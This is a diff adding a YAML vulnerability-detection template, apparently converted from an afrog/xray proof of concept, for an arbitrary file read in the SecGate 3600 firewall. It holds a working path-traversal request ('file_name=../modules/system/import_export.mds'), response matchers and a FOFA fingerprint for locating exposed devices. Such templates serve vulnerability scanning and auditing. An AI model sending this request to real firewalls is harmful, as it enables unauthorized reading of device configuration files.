@@ -1,0 +1,28 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - application/octet-stream
+          - modules/system/import_export.mds
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/?g=sys_export_conf_local_save&file_name=../modules/system/import_export.mds'
+id: secworld-secgate3600-obj-area-export-save-fileread
+info:
+  author: Observer
+  description: |
+    FOFA: fid="1Lh1LHi6yfkhiO83I59AYg=="
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 网神SecGate 3600 防火墙 obj_area_export_save 任意文件读取
+  severity: high
+  tags: secworld,fileread,argus-import
